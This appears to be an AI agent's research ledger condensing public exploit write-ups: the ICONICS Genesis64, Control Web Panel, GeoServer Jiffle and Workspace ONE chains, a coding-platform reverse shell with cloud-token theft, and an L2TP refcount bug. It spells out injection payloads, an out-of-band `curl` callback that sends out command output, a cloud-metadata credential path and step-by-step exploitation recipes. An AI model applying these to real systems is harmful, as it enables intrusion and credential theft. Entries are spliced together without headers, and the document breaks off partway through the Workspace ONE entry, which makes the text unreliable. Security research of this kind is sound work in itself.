SOURCE: https://github.com/0vercl0k/paracosme  2026-11-11
ROUTE: full repository README read live via `web_extract` (HTTP 200; the "Overview of the vulnerability" middle section was truncated in-line and read from the extractor's saved full text `/root/.hermes/cache/web/github.com-5d65775bac.md`, 478 lines — the decompiled `ReadVariant_` / MFC `operator>>` code, the crash stack and the RIP/ROP sections were read IN FULL this pass). Author Axel "0vercl0k" Souchet; the README links the full writeup `https://doar-e.github.io/blog/2023/05/05/competing-in-pwn2own-ics-2022-miami-exploiting-a-zero-click-remote-memory-corruption-in-iconics-genesis64/` and ships `src/paracosme.py` (exploit), `src/paracosme-poc.py` (crash PoC), `src/payload` (the DLL payload). ICONICS Genesis64 v10.97.1, CVE-2022-33318 / ZDI-22-1041, CVSS 9.8, fixed in 10.97.2; demonstrated at Pwn2Own Miami 2022 (S4x22).
STATUS: UNVERIFIED (not reproduced — no Genesis64 host was touched and no exploit was run this pass; every code fragment and quote below is the README's own text read live)
CLASS: RCE via memory corruption (use-after-free) in a network service's typed-value (VARIANT) deserializer — the error path frees a wire-created COM object while a caller-level handle still references it, the outer handler's cleanup releases it a second time (double-release UAF) → heap reclaim + vtable hijack → ROP → `LoadLibraryW` from a remote SMB share.
CORE METHOD (the README's own steps and code):
  1. THE SURFACE: `GenBroker64.exe` listens on TCP 38080 and deserializes typed packets after a client handshake; a VARIANT is "a type and a value". `Utils::ReadVariant_` unpacks arrays and fixed-size scalar types itself and FALLS THROUGH to MFC's generic `operator>>(CArchive&, COleVariant&)` (open source in `atlmfc\src\mfc\olevar.cpp`) for everything else.
  2. THE WEIRD FEATURE: for `VT_DISPATCH`/`VT_UNKNOWN` that operator reads a CLSID FROM THE WIRE and calls `CoCreateInstance(clsid, NULL, CLSCTX_ALL | CLSCTX_REMOTE_SERVER, ...)`, QIs for `IPersistStream`/`IPersistStreamInit` and calls `Load` on an attacker-built `CArchiveStream` — the attacker chooses which COM class the server instantiates and initializes from attacker bytes (the author: "What the hell? ... a weird feature"; `CLSCTX_REMOTE_SERVER` is in the call).
  3. THE UAF, verbatim: "The [CoCreateInstance] call writes the COM instance pointer directly in `pSrc->punkVal` which is the resulting variant stored in a caller several frames ahead. Then, if [IStreamPersist::Load] triggers an exception it is caught and [IUnknown::Release] is called on both ... which will free the COM object leaving the `pSrc->punkVal` dangling." The rethrown exception is caught by `Utils::ReadVariant`'s outer `CATCH_ALL(e) { VariantClear(Variant); }`, whose second `Release()` on the freed object crashes — "At this stage the variant has already been free'd but its type and value haven't been updated / changed so this [VariantClear] calls trigger a second [IUnknown::Release]". Trigger: any COM object implementing IPersistStream whose `Load` throws; the README's crash stack shows `OLEAUT32!VariantClear` → `GenBroker64+0xc20a`. Verification recipe, verbatim: "turn on Page Heap for `GenBroker64.exe`, restart the service, attach a debugger to `GenBroker64.exe`, run paracosme-poc.py against your server"; and "You need to attach a debugger to the target process to witness the crash otherwise the application ignores it" (the CATCH_ALL swallows it).
  4. GETTING RIP: "we race the thread to reclaim the `ole32!CFileMoniker` instance and replace it with controlled data (see `RacerThread_t`). As a result, we control the vtable pointer and are an instruction away from hijacking RIP" — `VariantClear`'s virtual `Release` does `mov rax,[rcx]; mov rax,[rax+10h]; call` on the reclaimed chunk.
  5. THE PAYLOAD DELIVERY: a `mov esp, ecx` stack pivot onto the reclaimed chunk ("the address of our heap chunk seems to be located (always?) in a location that fits in a 32-bit integer") → ROP (chain at paracosme.py@241) → "a sequence of gadgets that invokes `LoadLibraryW` with a remote SMB path pointing to a DLL file that hosts our payload" — served by impacket's `smbserver.py -smb2support x bin` (run instructions: `pip3 install impacket`, disable the local SMB server first), so the payload DLL never touches the target disk and no write primitive is needed.
DETECTION SIGNAL: any C/C++ service that deserializes typed TLV/variant structures from a network socket and (a) falls through to a framework generic archive `operator>>` that instantiates objects from a wire-supplied class id (CLSID/class name), or (b) has TRY/CATCH_ALL error cleanup that frees a resource whose pointer a caller-level handle still holds (freed-but-not-nulled). Operational tell: the service SURVIVES malformed typed packets silently ("the application ignores it") — the exception swallowing hides the corruption, so crash PoCs must be run under Page Heap + debugger or they look like non-bugs.
CHAIN: unauthenticated network client → handshake → a VARIANT of type `VT_DISPATCH`/`VT_UNKNOWN` carrying an attacker CLSID whose `IPersistStream::Load` throws (primitive: the wire chooses the COM class the server instantiates) → double-release UAF of the COM object (escalation: freed-but-referenced heap chunk) → racer thread reclaims the `CFileMoniker` chunk with controlled data → vtable hijack at `VariantClear`'s virtual `Release` → RIP → stack pivot + ROP → `LoadLibraryW` loads the attacker DLL from an SMB UNC path → arbitrary code as the GenBroker64 service on Windows 21H2 x64 (impact, the README's own: "remote code execution"; CVSS 9.8; Pwn2Own Miami 2022). Doctrine note: memory-corruption depth is LAB-ONLY — on a live target the safe product is the crash PoC verdict, never a weaponised payload.
TRANSFERABLE TEST: on any network deserializer that unpacks (type,value) structures: (1) map what happens to types the handler does NOT special-case — if they fall through to a generic framework deserializer, enumerate its object-instantiation primitives (a wire-supplied CLSID/class name is an instant red flag); (2) audit every CATCH/finally cleanup for the double-release shape — the error path frees X while a caller handle still points at X and the caller's own cleanup frees/clears X again; (3) if the service silently survives malformed typed packets, retest the crash PoC under Page Heap + debugger (crash swallowing is the tell, not the counter-proof); (4) exploitation pattern when a lab justifies it: reclaim the freed chunk → hijack the virtual call → pivot → `LoadLibraryW` over an attacker SMB share (no disk write). Rule: **a deserializer error path that frees an object a caller handle still references is a double-release UAF — and a service that "ignores" your malformed packet is the one hiding the crash; prove it under Page Heap + debugger before believing the negative.**
DEDUPE/DELTA: 0 hits across all three write targets for `paracosme`, `ICONICS`, `GenBroker`, `33318`, `38080`, `Pwn2Own`, `LoadLibraryW`, `smbserver`, `impacket`, `VariantClear`, `VT_DISPATCH`, `CFileMoniker`. Related-but-distinct REVIEWED and NOT re-recorded: the Adobe Flash UAF family (user-script explicit `release()` / wrapper stale reference — the free is attacker-TRIGGERED through a documented API, not exception cleanup), the PlayStation kernel UAF entries (missing-lock race; stack-pointer free race), the Flash `FileReferenceList` bulk-variant entry, the mruby VM-corruption entry, and the L4D2 NAV parser overflow → EIP control → RCE (linear overflow, file-push delivery). NEW: the network-deserializer double-release-via-exception-cleanup root cause + the wire-supplied-CLSID `CoCreateInstance` fall-through primitive + the crash-swallowing detection note + the SMB-UNC `LoadLibraryW` payload delivery. Ledger entry only (no §17 slot: "input reaches a deserializer → RCE" and the UAF class are recorded; this is a root-cause mechanism and carrier delta). FRESHNESS: Pwn2Own/CVE 2022-06, repo 2022-08 (archived 2023-10) — outside the preferred 6-12 month window (read because assigned).

SOURCE: https://hackingguy.medium.com/failed-coding-assessment-to-remote-code-execution-a-case-study-part-1-1778934b3b34  2026-11-11 (credited continuation read live the same pass: Part 2, https://hackingguy.medium.com/failed-coding-assessment-to-remote-code-execution-part-2-471bc82f4bd0 — located via the author's Medium profile; Part 1's own closing line points at the escalation, verbatim: "this is still pending how I escalated this to gaining a root shell in the server and getting complete access to AWS & Firebase tokens")
ROUTE: both parts read via `web_extract` (HTTP 200, complete). Author Akash Chhabra ("hackingguy"); Part 1 published 2022-08-20, Part 2 2022-08-24 (per the author's profile listing read this pass). Platform redacted ("REDACTED.com") by the author.
STATUS: UNVERIFIED (not reproduced — no assessment platform was exercised; every quote below is the author's own text)
CLASS: RCE / command execution + sensitive info disclosure — a "run my code" worker (online coding assessment / judge) executes attacker code BY DESIGN; the finding is the worker's REACH: hidden test-case inputs exfiltrated via OOB network from inside the worker, then a reverse shell in the container and production cloud credentials sitting in the worker's environment.
CORE METHOD (the author's own steps):
  1. THE PIVOT, verbatim: after `system("ls")` in the submitted C++ showed only "input source code and its executable — no input test cases file" and "I/O were hidden for these test cases" — "What if I could send the input variable data as a payload to some server while executing code which will be hosted by me?" Start a netcat TCP server, expose it with ngrok ("temporary global domain name utility for a local port"), and run `system("ping https://<random>.ngrok.io")` as a beacon: "And Boom! I was able to see a request from the REDACTED.com's server on my very basic TCP server."
  2. HIDDEN-IO EXFIL: pass the hidden input variables into the `system()` command (each test case had 4 inputs) and POST them to the listener — "I was able to get those two input test cases on my local server with a POST request upon execution" (the platform's hidden-I/O protection is defeated purely because the worker has egress).
  3. PART 2 ESCALATION: a Python reverse shell ("a piece of code, which can help to get a C&C ... because the connection is created from the server side to the attacker"; fd/socket plumbing) passed as the `system()` parameter over the ngrok TCP domain → "I got a reverse shell on REDACTED.com's code execution docker on my terminal running Netcat. I was in this docker container, running bash shell."
  4. ENUMERATE THE WORKER: a `.sentry` file held "some public tokens ... so no use case" — then `env`: "their code execution environment has all credentials including AWS_S3_TOKENS, FIRESTORE_TOKENS and HOST=`root`, I never realised everything was happening on the Root docker container" → production cloud-credential theft.
DETECTION SIGNAL: any feature that compiles/executes user-supplied code (coding assessments and interview platforms, CI runners, serverless/edge functions, low-code script steps, plugin/report/formula sandboxes) where the I/O is hidden or graded ("test cases" invisible in-band); the primitive is live when submitted code reaches the network (your OOB beacon fires) and the worker's context is juicy when `env`/`/proc/self/environ` shows non-disposable secrets or the k8s service-account token path exists.
CHAIN: candidate submits code (by-design execution primitive) → `system()`/`subprocess` + OOB callback defeats hidden I/O (primitive: worker egress) → hidden test-case inputs exfiltrated (impact link 1: assessment-integrity/confidentiality break) → reverse shell inside the code-execution container (escalation: full interactive context as the worker user — here `HOST=root`) → `env` leaks AWS S3 + Firestore/Firebase tokens (impact: production cloud-credential theft — the author's own words "complete access to AWS & Firebase tokens"). Honest limits: one platform, redacted; the demonstrated data impact is the env credentials and the test cases; Part 3 (reporting writeup) carries no further technique.
TRANSFERABLE TEST: on every "run user code" surface submit one benign callback (C `system("curl https://<collab>/?x=$(id|base64)")`, Python `urllib.request.urlopen`, Node `fetch`) — a hit proves execution + egress. Then, one step per finding and stop: (a) read the hidden inputs/grading data from inside the worker and POST them to your listener (the hidden-I/O break); (b) `env` / `cat /proc/self/environ` and report only the CLASS of any secret found (never exfiltrate values — one benign command, per the playbook's impact ceiling); (c) check `/var/run/secrets/kubernetes.io/serviceaccount/token` and `http://169.254.169.254/latest/meta-data/iam/security-credentials/`. Rule: **where the product runs your code by design, the execution is not the bug — everything the worker can reach is the bug (hidden data, env secrets, cloud metadata); prove it with one benign OOB callback and stop.**
DEDUPE/DELTA: 0 hits across all three write targets for `hackingguy`, `coding assessment`, `online judge`, `hidden test`, `ngrok` as an exfil channel (the single `ngrok` hit is batch-132's SSRF-redirector duplicate ruling), `.sentry`, `AWS_S3_TOKENS`, `FIRESTORE_TOKENS`, `code execution docker`. Related-but-distinct REVIEWED and NOT re-recorded: the NX Cloud cache-poison entry (build env vars as the EXFIL TARGET after pipeline RCE — there the execution primitive is a vulnerability; here it is the product feature), GitHub-Actions `$GITHUB_ENV` delimiter injection (injecting INTO a runner — the opposite direction), the `/proc` self-inspection checklist (~ledger 998) and the k8s-SA-token/IMDS escalation lines (~5671/5731, chain endpoints of OTHER primitives). NEW: hidden-I/O defeat via worker-egress exfil + the "by-design code-execution feature: hunt the worker's context, not an escape" framing. Ledger entry only (no §17 slot: "RCE → enumerate the execution context → cloud creds" is a recorded chain shape; the delta is the by-design entry point and the hidden-input exfil channel). FRESHNESS: 2022-08 (Parts 1+2) — outside the preferred 6-12 month window (read because assigned).

SOURCE: https://labs.nettitude.com/blog/cve-2022-30211-windows-l2tp-vpn-memory-leak-and-use-after-free-vulnerability/  2026-11-11
ROUTE: `web_extract` on the assigned URL followed the vendor's redirect to the current home (Nettitude → LRQA rebrand) and returned the FULL article at `https://www.lrqa.com/en/cyber-labs/cve-2022-30211-windows-l2tp-vpn-memory-leak-and-use-after-free-vulnerability/` (HTTP 200; root-cause pseudocode for `SetupTunnel` and `DereferenceTunnel`, both impact conditions and the timeline were read in full this pass).
STATUS: UNVERIFIED (not reproduced — no L2TP driver was exercised; pseudocode and quotes below are the article's own)
CLASS: memory corruption (kernel use-after-free via reference-count games) — a reference COUNT INCREMENT on a context-structure REUSE path with no matching decrement anywhere, plus a SIGNED refcount check in the free path → refcount overflow to negative → `ExFreePoolWithTag` frees the tunnel context while it remains on the global linked list → any later UDP packet naming the freed ID touches freed kernel memory (CWE-190 → CWE-416). Demonstrated impact = availability (memory exhaustion); the article states the UAF "could potentially then be used to achieve Remote Code Execution" but also judges realistic exploitation far-fetched. Per doctrine §2(d)/§8: NOT reportable as RCE and the DoS is never reportable — recorded strictly as a lab audit technique.
CORE METHOD (the article's own analysis):
  1. SURFACE: `rasl2tp.sys` L2TP driver (Windows 7/Server 2008 and later). Each tunnel context is keyed by (assigned tunnel ID, UDP source IP:port). For PoC simplicity the article disables the IPsec layer — `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\RasMan\Parameters\ProhibitIpSec` = 1 (DWORD) — to speak L2TP directly over UDP ("it does make testing the L2TP driver a great deal easier"; the bug is also reachable through IPsec).
  2. THE INCREMENT (pseudocode in `SetupTunnel`): on a `StartControlConnectionRequest` carrying NO tunnel/session ID in the L2TP header but an ASSIGNED tunnel ID matching one previously used from that source, the driver reuses the existing context (`TunnelCbFromIpAddressAndAssignedTunnelId`) and calls `ReferenceTunnel(NewTunnel, 1)` — "The issue is that the reference count does not have an appropriate dereference anywhere in the code. This means that it is possible for a malicious client to continually send `StartControlConnectionRequests` to increment the value indefinitely." (Amplified: spoof numerous IP/tunnel-ID combinations to pin structures alive → server memory exhaustion.)
  3. THE UAF FLIP (`DereferenceTunnel`): the decrement goes into a SIGNED refcount; the proper unlink path runs only `if (!RefCount)`, and the later `if (RefCount > 0) return;` is signed-overflowable — "using the reference increment bug we can cause the reference count value to overflow and become a negative number. This would cause the `DereferenceTunnel` function to free the target tunnel context structure without removing it from the global linked list."
  4. THE REACH: "If a freed structure was still present in the list, any UDP packet referencing the freed context structure's ID would be able to gain access to the freed structure and could be used to further corrupt kernel memory."
  5. THE AUTHOR'S OWN CAVEAT, verbatim: "the total required throughput is huge and would almost definitely be detected as a denial of service (DoS) attack long before reaching the required reference count" — i.e. the RCE ceiling exists in code but the practical demonstration is the exhaustion DoS.
DETECTION SIGNAL: any protocol service/driver that REUSES an existing context structure when a client re-presents a previously assigned id (connection re-establishment, session resume, "already seen" fast paths) with refcounted lifetime; the tell: the reuse path increments a reference with no session-scoped matching decrement, and the free path guards on a SIGNED refcount (or any free that can run while the object is still linked from a global registry).
CHAIN: network client → repeated `StartControlConnectionRequest` reusing one assigned tunnel ID (primitive: increment-without-decrement) → refcount grows without bound and overflows to negative (escalation: the signed `RefCount > 0` guard now fails to stop the free) → `DereferenceTunnel` frees the context while it stays on the global list → UAF of a kernel structure reachable by any packet naming its ID → kernel memory corruption → potential RCE (the article's ceiling) — with the honest step the article itself supplies: realistically the path stops at resource exhaustion (DoS) long before the overflow. Doctrine: chain material only; never attempt the exhaustion against live targets.
TRANSFERABLE TEST (LAB ONLY): for any refcounted context keyed on client-supplied ids: (1) re-send the establish/reuse request N times reusing ONE id and watch refcount/heap growth — unbounded growth = the increment bug (this alone is the safe, non-destructive finding on a live target, framed as availability); (2) audit the decrement path for a SIGNED refcount and a free reachable while the object is still linked from a registry/list; (3) on a lab VM, push the refcount negative and confirm free-while-still-listed (KASAN / Driver Verifier / Page Heap). Rule: **refcount incremented on the REUSE path with no matching dereference + a signed refcount guard = a free-while-still-reachable UAF — and the exploitability question is decided by whether the free can be reached WITHOUT first exhausting resources; if not, the finding is availability and nothing more.**
DEDUPE/DELTA: 0 hits across all three write targets for `rasl2tp`, `30211`, `L2TP`, `StartControlConnection`, `refcount` / `reference count` (as a corruption mechanism), `ProhibitIpSec`. Related-but-distinct REVIEWED and NOT re-recorded: PlayStation `IPV6_2292PKTOPTIONS` (missing-LOCK race UAF), PS5 `sys_fsc2h_ctrl` (kernel-stack-pointer free race), the Flash `FileReference`/PSDK UAFs (script-triggered `release()`), the L4D2 NAV overflow (linear overflow → EIP). NEW: the REFERENCE-COUNT mechanism itself — increment-on-reuse + signed overflow → free-while-still-linked — a different root cause from every recorded race/overflow UAF. Ledger entry only (no §17 slot: the UAF class is owned; this is a root-cause mechanism delta). FRESHNESS: reported 2022-04-20, patched 2022-07-12 — outside the preferred 6-12 month window (read because assigned).

SOURCE: https://www.immersivelabs.com/blog/we-discovered-major-vulnerabilities-in-control-web-panel-heres-how-we-found-them/  2026-11-11
ROUTE: `web_extract` of the blog (first pass returned a stub ending mid-word at "How we found them"; a second pass at a larger char budget returned the full technical sections — both CVE narratives read in full) PLUS the credited PoC repository `https://github.com/Immersive-Labs-Sec/CentOS-WebPanel` read live via `web_extract` this pass for the exact request shapes, the token-generator evidence and the version gates (the blog itself links this repo for "PoC scripts"). Immersive Labs disclosure 2022-08-15; MITRE: CVE-2022-25046 (path traversal → RCE), CVE-2022-25047 (account hijack via the password reset token), CVE-2022-25048 (standard user executes commands as root). Product: Control Web Panel / CentOS Web Panel (CWP) ≤ 0.9.8.1124 (per the PoC repo's version gates).
STATUS: UNVERIFIED (not reproduced — no CWP instance was touched; every quote and request shape below is the blog's or the PoC repo's own text read live)
CLASS: account takeover + RCE — deterministic password-reset-token forgery (CVE-2022-25047) chained to authenticated root command injection (CVE-2022-25048), plus a separate pre-auth chain: check-then-transform path-traversal filter bypass → LFI + command injection → root RCE (CVE-2022-25046).
CORE METHOD (blog verbatim + PoC repo request shapes):
  1. TOKEN FORGERY (CVE-2022-25047), verbatim: "the password reset token generation didn't include any elements that were secret or random. In fact, every element of the password reset token could be calculated if you had the email address and username of any given user". Procedure: "trigger a valid password reset for a known account and intercept the response. The server response will contain the date and time that that password reset was requested. The date returned by the server will match within a few milliseconds the date that was used to generate the reset token. This reset token can now be used to set a new password for the account without needing access to the target's email account." The PoC (`password_reset.py`) prints the inversion live: "Got Date 2022-01-31 14:47:34 from response" → "Generating Reset Token with username, email and reset token" → "[*] Token: 681bb70c8452b33f9d7b6e319c20727b" (a 32-hex digest) → "Password has been set ... for username"; repo commits "Add new token string to password_reset" / "Check both known token strings on password reset" show the generator formula varies by CWP version and the PoC tries each known one. Limits, verbatim: "this attack won't work for the root account, instead generating and sending a password reset email".
  2. TRAVERSAL REASSEMBLY (CVE-2022-25046), verbatim: "the first check is for a string comparison that looks for `..`, and checks to see if the null byte trick is being used ... From here, the function removes any whitespace from the ends, replaces any null bytes, then filters an HTML. Then comes the issue. If you send a string like `variable=../`, the first check is fine as `..` isn't present. But after the final strip tags, you're left with `variable=../../`." (The blog's own renderer ate the removable character in the payload — the construction is a traversal whose dots are separated by a tag-shaped fragment the strip_tags step DELETES, so the check never sees `..` and the later filter reassembles it.) Then: "We searched for existing functions that could be used to run OS commands, and actually found a command injection vulnerability that we chained together with the filter bypass to gain code execution." PoC repo `pre_auth_rce.py`, verbatim: "This exploit chains a Local File Inclusion Vulnerability with a Command Injection vulnerability" — `python3 pre_auth_rce.py --target "127.0.0.1" --command "sleep 15"` (optional reverse shell via `--lhost/--lport`), "gain Remote Code Execution as root without any privileges", CWP ≤ 0.9.8.1120.
  3. ROOT COMMAND INJECTION (CVE-2022-25048), verbatim: "input data from the user is used to create a shell command that's then executed in the context of the root account" — several instances. PoC repo shapes: login-flow `userlang` parameter (`user_auth_rce.py`, "requires a valid username and password but can be chained with the account takeover"); module POST injections: `[POST] /index.php?module=mysql_manager&acc=optimizerdb` with `db=test_hello$(whoami>/tmp/xxx)`; `module=disk_usage&acc=load_directory` with `folder_name='/home/<user>/$(id>/tmp/id)'`; `module=letsencrypt&acc=infomodal` with `domain=test.example.com$(whoami>/tmp/www)&type=info`; `module=error_log&acc=select` with `textsearch=howdy$(id>/tmp/howdy)`; `dns_zone_editor` `namereg=touch /tmp/hello&domain=test.example.com&cachereg=1&valuereg="aGVsbG8="&reg=TXT`.
  4. CHAIN-LINK BONUS (same repo): an INTERNAL API "not protected from access ... Any user account with the ability to host files via the FileManager can access this API" exposing account listing/creation/modification (`internal_api.php`) — the same shared-hosting root context makes it tenant-wide.
DETECTION SIGNAL: fingerprints `Server: cwpsrv` / `Set-Cookie: cwpsrv` (Shodan query `"Server: cwpsrv"`; SSL org "CentOS Web Panel"). Class signals: (a) a reset token that is a digest of user-known values (username/email/uid) + a request timestamp — especially when the reset RESPONSE echoes the request time; (b) any path/keyword denylist whose check runs BEFORE a stripping/normalizing transform (strip_tags, trim, null-byte removal).
CHAIN: unauthenticated attacker who knows victim username+email (primitive) → trigger a password reset and read the request timestamp from the response (primitive: the response leaks the token-generation time "within a few milliseconds") → derive the token from username+email+date (escalation: deterministic token, zero email access) → set a new password → ATO of any non-root user → login as that user → `userlang` / module POST parameter command injection runs "in the context of the root account" (escalation: root) → full shared-hosting compromise of every tenant on the box ("if the main host gets compromised, so will every account that's provisioned on the server"; ~185,000 CWP servers live at disclosure, "millions of websites"). Parallel pre-auth path: traversal-reassembly bypass → LFI → command injection → root with no credentials at all.
TRANSFERABLE TEST (two reproducible tests):
  (1) TOKEN INVERSION: on any password-reset flow, trigger a reset for YOUR OWN account and capture the complete RESPONSE; note every echoed field (request date/time especially); rebuild the token from non-secret inputs — `md5`/`sha1` of concatenations of username, email, uid and the timestamp in each timezone/format — and diff against your own known token; if a formula reproduces yours, the token is a function you can call for anyone (test only against accounts you own or are authorised to test). The CWP shape to try first: digest(username + email + response-date).
  (2) REASSEMBLY BYPASS: against any `..`/keyword denylist, place filter-REMOVABLE fragments inside the forbidden token (tag-shaped substrings for strip_tags-style HTML filters, `%00` for null-strippers, trim-able whitespace, normalizable/overlong characters) and let the post-check transform rebuild it — traversal strings like `.<.>./`-style dot pairs; if the traversal lands, chain to the nearest include/read or command sink. Rule: **a denylist that inspects the INPUT while a later filter MUTATES it can always be defeated — the check sees the pre-transform string, so smuggle removable characters into the forbidden sequence and let the filter do the bypass for you; and a reset token built from public values plus a timestamp the response hands you is not a token, it is a function you call.**
DEDUPE/DELTA: 0 hits across all three write targets for `CWP`, `Centos Web Panel`, `Control Web Panel`, `25046`, `25047`, `25048`, `cwpsrv`, `userlang`, `immersive`, `pre_auth_rce`. Related-but-distinct REVIEWED and NOT re-recorded: the auth checklist bullets "Predictable/eternal password-reset tokens → reset any account" and "Predictable remember-me token = `userid:hash`; check whether the hash is `md5(username)` or otherwise derivable" (ledger ~633-635 — the CLASS is flagged there but no inversion METHOD is recorded anywhere), §17.46 (reset token RETURNED in the initiate response — leaked, not derived), §17.9 (reset-email JSON-array confusion), §17.502 (state change must burn outstanding tokens), and the ledger line-139 ordering lesson (HTML sanitizer post-processing re-entry — different direction: "transform AFTER sanitize = new injection surface" vs "transform AFTER the denylist check = check bypass"). ROUTE: `web_extract` of the assigned URL returned the article head+tail with a truncation notice; the omitted MIDDLE — the whole exploitation half — was then read IN FULL this pass from the extractor's saved full text (`/root/.hermes/cache/web/www.synacktiv.com-5a53e34346.md`, every payload, generated-source leak and code snippet). Article by Vincent Herbulot & Rémi Matasse (Synacktiv), 2022-08-12; CVE-2022-24816 (NVD CVSS 9.8), JAI-EXT < 1.1.22, patch commit cb1d6565 ("Validate Jiffle input variable names according to grammar, escape Javadocs when including Jiffle sources in output"); lab `docker run -p 8085:8080 kartoza/geoserver:2.17.2`.
STATUS: UNVERIFIED (not reproduced — no GeoServer was exercised; every quote and request shape below is the article's own text read live this pass)
CLASS: code injection → RCE (unauthenticated) — a user-supplied DSL (Jiffle map-algebra script) is compiled into GENERATED JAVA SOURCE and then bytecode-compiled via Janino; the script is embedded UNESCAPED inside a Javadoc comment of the generated source, so a `*/` closes the comment and arbitrary Java lands in the compilation unit; execution is then won by SHADOWING a class the generated code references (`Double`) with a rogue class whose STATIC INITIALIZER runs on first static-field access.
CORE METHOD (the article's own steps):
  1. ENTRY POINT, unauthenticated: `POST /geoserver/wms` with a WPS `Execute` XML body naming `<ows:Identifier>ras:Jiffle</ows:Identifier>` and the script in `<wps:LiteralData>` — "On a default installation Jiffle scripts can be run by non-authenticated users" (build the request from the WPS builder demo page).
  2. THE BREAKOUT: the generated source embeds the script as `/** ... * <script> ... */` in a Javadoc ("Jiffle integrates the comments when generating the final java source code without properly escaping them"). Probe script `dest = 1; */` yields the verbose error `Runtime source error for source: ... Line 11, Column 3: One of 'class enum interface @' expected instead of '*'` — the error REFLECTS the generated source with the comment already terminated. Payload shape: `<wps:LiteralData>dest = 1; */ INJECTED JAVA CODE /*</wps:LiteralData>` (the trailing `/*` re-opens the comment "so we also need to fix the remaining comments", letting the rest of the generated file parse).
  3. FROM CLASS INJECTION TO EXECUTION: injecting a class compiles but does not run — "We do not control an object that will be instantiated... the classes that we create are not directly loaded into memory, they are rather lazy-loaded by the class loader at runtime". Redefining the generated `JiffleIndirectRuntimeImpl` fails (`Redeclaration of type "JiffleIndirectRuntimeImpl"`). The trick: the generated code contains `double result = Double.NaN;` — inject your OWN `public class Double { public static double NaN = 0; static { ... } }`; per the JLS quote in the article ("A class or interface type T will be initialized immediately before the first occurrence of any one of the following: [...] A static field declared by T is assigned"), `Double.NaN` initializes the rogue class and its `static {}` block EXECUTES ("since static blocks of code are executed when a class is loaded in memory, accessing the static attribute NaN of our rogue Double class will trigger the execution of the static block of code").
  4. OUTPUT CHANNEL: run `java.lang.Runtime.getRuntime().exec("id")` in the static block and `throw new RuntimeException(allLines)` with the command output — the WPS failure response returns it in `<ows:ExceptionText>java.lang.ExceptionInInitializerError - uid=0(root) gid=0(root) groups=0(root)`.
DETECTION SIGNAL: any feature that compiles a user-supplied DSL/script/template into generated source + bytecode (GIS/OGC WPS processes like `ras:Jiffle`, report/formula engines, rule/flow designers, template-to-code exporters, low-code script steps); the tell is a verbose compiler error that REFLECTS THE GENERATED SOURCE ("Runtime source error for source: ...") with your input sitting inside a `/** ... */` block; probe with `*/` and watch for the compiler complaining about a `*` where `class enum interface` is expected.
CHAIN: unauthenticated WPS `ras:Jiffle` script input (primitive) → script embedded unescaped in a Javadoc comment of the generated Java (codegen) → `*/` comment terminator injects arbitrary Java into the compilation unit (code injection — the §17.480 comment-breakout mechanism) → Janino compiles the attacker class (arbitrary bytecode) → rogue `Double` class with a `static{}` initializer hijacks execution at `double result = Double.NaN` (the NEW link: compile-only context → guaranteed execution) → `Runtime.exec` as the GeoServer process — the article's demo returns `uid=0(root)` in its Docker — unauthenticated RCE, command output returned in the service's own error report.
TRANSFERABLE TEST: on any user-script→generated-code surface: (1) submit `*/` and read the error — if it reflects the generated source with your input inside a comment, the breakout is open; (2) inject `*/ <minimal Java> /*` and look for a compile error naming YOUR tokens ("cannot find symbol", "Redeclaration of type") = code injection into the compilation unit; (3) when nothing instantiates your class, search the leaked generated source for a reference to a REDECLARABLE class (a static-field access like `Double.NaN`) and shadow it with `public class <Name> { public static <type> <field> = <zero>; static { <your code>; } }` — the JVM initializes your class at that access whether or not anyone constructs it; (4) exfiltrate through the service's own error channel (`throw` a RuntimeException carrying command output) or one benign OOB callback. Rule: **a DSL compiled into generated source is a code-injection surface — the comment your script sits in is the boundary; and in a compile-only JVM context, class shadowing + a static initializer is the execution hook, because class initialization triggers on first static-field access even with zero instantiations.**
DEDUPE/DELTA: 0 hits across all three write targets for `jiffle`, `geoserver`, `janino`, `24816`, `static initializer`/`static block`, `class shadow`, `Double.NaN`, `redeclaration of type`, `ras:Jiffle`, `wps`. Related-but-distinct REVIEWED and NOT re-recorded: §17.480 (Elastic Synthetics Recorder — the COMMENT-TERMINATOR mechanism `*/ ... /*` in generated code is already owned there; this entry is the DELTA: a DSL embedded with ZERO escaping plus the compile-only→execution primitive), §17.104 (Kibana `\u2028\u2029\n;` generated-source LINE breakout after prototype pollution — value context, not comment context), the Grab/§17.510 Jackson entry (attacker bytecode via `transletBytecodes` with a runtime instantiation gadget — a different execution route). NEW → §17.511: class SHADOWING + STATIC INITIALIZER as the execution primitive in compile-only codegen, plus throw-into-error-report output. SOURCE: https://srcincite.io/blog/2022/08/11/i-am-whoever-i-say-i-am-infiltrating-vmware-workspace-one-access-using-a-0-click-exploit.html  2026-11-11
ROUTE: `web_extract` twice (first pass cut mid-article; a second pass at 40K budget still elided sections) → the full 33,547-char page was then read IN FULL via `browser_exec` (`document.body.innerText`), including every decompiled snippet, request/response pair and the PoC generator code. Author Steven Seeley (sourceincite); reported to VMware 2022-03-02, published 2022-08-11; pre-auth remote root chain "Hekate" (Black Hat USA 2022), exploits at https://github.com/sourceincite/hekate/; product: VMware Workspace ONE Access (on-prem AND cloud, "in its default configuration").
STATUS: UNVERIFIED (not reproduced — no Workspace ONE Access instance was touched; every quote and request shape below is the article's own text)
CLASS: authentication bypass (OAuth2) + JDBC injection → insecure deserialization → RCE + sudo-script privilege escalation — one pre-authenticated 0-click remote-root chain against the organization's IAM/SSO appliance.
CORE METHOD (the article's own steps):
  1. AUTH BYPASS — DEFAULT INTERNAL OAUTH2 CLIENT + CRED-MINTING ACTIVATION ENDPOINTS: `BootstrapController` → `createTenant` → `createDefaultServiceOAuth2Client` installs a system-scoped client with the FIXED id `Service__OAuth2Client`. The activation endpoints need no auth: `POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client` (empty body) returns `{"activationToken": "eyJvdG..."}`; `POST /SAAS/API/1.0/REST/oauth2/activate` with that token as the raw body returns `{"client_id": "Service__OAuth2Client", "client_secret": "..."}` — "This is enough for an attacker to then exchange the client_id and client_secret for an OAuth2 token to achieve a complete authentication bypass... exploitation is just the standard OAuth2 flow to grab a signed JWT."
